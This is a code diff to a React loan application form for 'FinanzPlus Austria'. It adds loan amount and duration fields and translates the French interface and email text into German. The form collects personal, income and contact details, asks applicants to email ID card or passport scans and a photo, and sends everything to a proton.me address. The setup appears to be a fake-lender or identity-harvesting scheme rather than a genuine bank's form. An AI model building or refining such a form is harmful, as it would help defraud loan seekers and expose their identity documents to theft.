@@ -10,6 +10,8 @@ function App() {
     telephone: '',
     travail: '',
     revenuMensuel: '',
+    montantPret: '',
+    dureeRemboursement: '',
     accepteConditions: false
   });
 
@@ -90,6 +92,12 @@ function App() {
     if (!formData.revenuMensuel || formData.revenuMensuel <= 0) {
       newErrors.revenuMensuel = 'Das monatliche Einkommen muss größer als 0 sein';
     }
+    if (!formData.montantPret || formData.montantPret <= 0) {
+      newErrors.montantPret = 'Der Kreditbetrag muss größer als 0 sein';
+    }
+    if (!formData.dureeRemboursement || formData.dureeRemboursement < 1 || formData.dureeRemboursement > 360) {
+      newErrors.dureeRemboursement = 'Die Rückzahlungsdauer muss zwischen 1 und 360 Monaten liegen';
+    }
     if (!files.identityDocument) {
       newErrors.identityDocument = 'Personalausweis/Reisepass ist erforderlich';
     }
@@ -116,53 +124,58 @@ function App() {
       return;
     }
 
-    // Créer le corps de l'email avec toutes les informations
+    // Créer le corps de l'email avec toutes les informations EN ALLEMAND
     const emailBody = `
-DEMANDE DE PRÊT FINANZPLUS AUSTRIA
+KREDITANTRAG FINANZPLUS AUSTRIA
 =====================================
 
-INFORMATIONS PERSONNELLES
+PERSÖNLICHE INFORMATIONEN
 -------------------------
-Nom: ${formData.nom}
-Prénom: ${formData.prenom}
-Âge: ${formData.age} ans
+Name: ${formData.nom}
+Vorname: ${formData.prenom}
+Alter: ${formData.age} Jahre
 Adresse: ${formData.adresse}
 
-COORDONNÉES
------------
-Numéro de téléphone: ${formData.telephone}
-
-INFORMATIONS PROFESSIONNELLES
------------------------------
-Travail/Profession: ${formData.travail}
-Revenu mensuel: ${formData.revenuMensuel} €
-
-DOCUMENTS
----------
-⚠️ IMPORTANT: Veuillez attacher les documents suivants à cet email:
-- Carte d'identité / Passeport (${files.identityDocument ? files.identityDocument.name : 'Non fourni'})
-- Photographie d'identité (${files.photo ? files.photo.name : 'Non fourni'})
-
-CONSENTEMENT
+KONTAKTDATEN
 ------------
-✓ J'accepte les conditions d'éligibilité
+Telefonnummer: ${formData.telephone}
+
+BERUFLICHE UND FINANZIELLE INFORMATIONEN
+-----------------------------------------
+Beruf: ${formData.travail}
+Monatliches Einkommen: ${formData.revenuMensuel} €
+
+KREDITDETAILS
+-------------
+Gewünschter Kreditbetrag: ${formData.montantPret} €
+Rückzahlungsdauer: ${formData.dureeRemboursement} Monate
+
+DOKUMENTE
+---------
+⚠️ WICHTIG: Bitte fügen Sie die folgenden Dokumente als Anhang zu dieser E-Mail hinzu:
+- Personalausweis/Reisepass (${files.identityDocument ? files.identityDocument.name : 'Nicht bereitgestellt'})
+- Lichtbild (${files.photo ? files.photo.name : 'Nicht bereitgestellt'})
+
+ZUSTIMMUNG
+----------
+✓ Ich akzeptiere die Teilnahmebedingungen
 
 =====================================
-Date de soumission: ${new Date().toLocaleString('fr-FR')}
+Einreichungsdatum: ${new Date().toLocaleString('de-DE')}
     `.trim();
 
     // Créer le lien mailto avec le sujet et le corps
-    const subject = encodeURIComponent('Demande de prêt FinanzPlus Austria');
+    const subject = encodeURIComponent('Kreditantrag FinanzPlus Austria');
     const body = encodeURIComponent(emailBody);
     const mailtoLink = `mailto:kontakt_finanzplusaustria@proton.me?subject=${subject}&body=${body}`;
 
     // Ouvrir le client email
     window.location.href = mailtoLink;
 
-    // Afficher un message de succès
+    // Afficher un message de succès EN ALLEMAND
     setSubmitStatus({
       type: 'success',
-      message: 'Votre client email va s\'ouvrir. N\'oubliez pas d\'attacher les documents (carte d\'identité et photo) avant d\'envoyer !'
+      message: 'Ihr E-Mail-Client wird geöffnet. Vergessen Sie nicht, die Dokumente (Personalausweis und Foto) anzuhängen, bevor Sie senden!'
     });
 
     // Réinitialiser le formulaire après 3 secondes
@@ -175,6 +188,8 @@ Date de soumission: ${new Date().toLocaleString('fr-FR')}
         telephone: '',
         travail: '',
         revenuMensuel: '',
+        montantPret: '',
+        dureeRemboursement: '',
         accepteConditions: false
       });
       setFiles({
@@ -311,6 +326,38 @@ Date de soumission: ${new Date().toLocaleString('fr-FR')}
                 step="0.01"
               />
               {errors.revenuMensuel && <span className="error-message">{errors.revenuMensuel}</span>}
+            </div>
+
+            <div className="form-group">
+              <label htmlFor="montantPret">Gewünschter Kreditbetrag (€) *</label>
+              <input
+                type="number"
+                id="montantPret"
+                name="montantPret"
+                value={formData.montantPret}
+                onChange={handleInputChange}
+                className={errors.montantPret ? 'error' : ''}
+                placeholder="Wie viel möchten Sie leihen?"
+                min="0"
+                step="0.01"
+              />
+              {errors.montantPret && <span className="error-message">{errors.montantPret}</span>}
+            </div>
+
+            <div className="form-group">
+              <label htmlFor="dureeRemboursement">Rückzahlungsdauer (Monate) *</label>
+              <input
+                type="number"
+                id="dureeRemboursement"
+                name="dureeRemboursement"
+                value={formData.dureeRemboursement}
+                onChange={handleInputChange}
+                className={errors.dureeRemboursement ? 'error' : ''}
+                placeholder="Anzahl der Monate"
+                min="1"
+                max="360"
+              />
+              {errors.dureeRemboursement && <span className="error-message">{errors.dureeRemboursement}</span>}
             </div>
           </section>
 
